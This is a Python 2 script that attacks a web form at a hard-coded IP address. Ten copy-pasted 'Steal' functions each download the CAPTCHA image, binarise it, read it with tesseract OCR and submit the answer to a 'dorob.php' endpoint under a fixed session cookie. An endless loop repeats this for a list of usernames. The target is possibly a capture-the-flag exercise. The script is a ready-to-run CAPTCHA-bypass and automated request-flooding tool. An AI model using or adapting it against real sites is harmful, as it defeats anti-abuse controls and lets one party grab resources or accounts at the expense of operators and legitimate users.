# -*- coding: cp936 -*-
import os
import urllib2
import urllib
import re,sys
from PIL import Image
import time

#分了三步:
#1.访问表单页面
#2.访问验证码页面，提取验证码并处理识别
#3.访问提交页面，提交需要的数据

def Steal():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\a.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('a.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('ah.jpg','JPEG')
    os.system('tesseract ah.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'tuhao10','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal2():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\b.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('b.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('bh.jpg','JPEG')
    os.system('tesseract bh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'tuhao8','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()
def Steal3():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\c.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('c.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('ch.jpg','JPEG')
    os.system('tesseract ch.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'tuhao7','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal4():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\d.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('d.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('dh.jpg','JPEG')
    os.system('tesseract dh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'tuhao9','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal5():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\e.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('e.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('eh.jpg','JPEG')
    os.system('tesseract eh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'tuhao6','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal6():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\f.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('f.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('fh.jpg','JPEG')
    os.system('tesseract fh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'ppppww','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal7():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\g.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('g.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('gh.jpg','JPEG')
    os.system('tesseract gh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'jtgoogle','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal8():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\h.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('h.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('hh.jpg','JPEG')
    os.system('tesseract hh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'sd333','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

    
def Steal9():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\i.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('i.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('ih.jpg','JPEG')
    os.system('tesseract ih.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'adminpwn','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()

def Steal10():
    urlcode="http://106.75.30.59:8888/rob.php?id=368"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fnew=urllib2.urlopen(reqcode)
    urlcode="http://106.75.30.59:8888/code.php"
    coocode="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    reqcode=urllib2.Request(urlcode)
    reqcode.add_header('Cookie',coocode)
    fcode=urllib2.urlopen(reqcode)
    fil=open("D:\\j.jpg",'wb')
    fil.write(fcode.read())
    fil.close()
    im=Image.open('j.jpg')
    box=im.copy()
    box=(3,2,47,23)
    region=im.crop(box)
    imgry=region.convert('L')
    threshold=138
    table=[]
    for i in range(256):
        if i<threshold:
            table.append(0)
        else:
            table.append(1)
    out=imgry.point(table,'1')
    out.save('jh.jpg','JPEG')
    os.system('tesseract jh.jpg result')
    ff=open('result.txt','r')
    s=ff.read()[0:4]
    #print len(s)
    print s
    url="http://106.75.30.59:8888/dorob.php"
    coo="PHPSESSID=mkjgcmb2saf3o1dh0u8krvo3t6"
    data={'user':'faih4444','num':'1','code':s}
    data=urllib.urlencode(data)
    req=urllib2.Request(url,data)
    req.add_header("Cookie",coo)
    f=urllib2.urlopen(req)
    while 1:
        d=f.read(1024)
        if not len(d):
            break
        sys.stdout.write(d)
    ff.close()
    
if __name__=='__main__':
    os.chdir('D:\\')
    q=0
    while 1:
        if q==0:
            Steal()
        if q==1:
            Steal()
        if q==2:
            Steal2()
        if q==3:
            Steal3()
        if q==4:
            Steal4()
        if q==5:
            Steal5()
        if q==6:
            Steal6()
        if q==7:
            Steal7()
        if q==8:
            Steal8()
        if q==9:
            Steal9()
        if q==10:
            Steal10()
        if q==10:
            q=0
        else:
            q=q+1
        


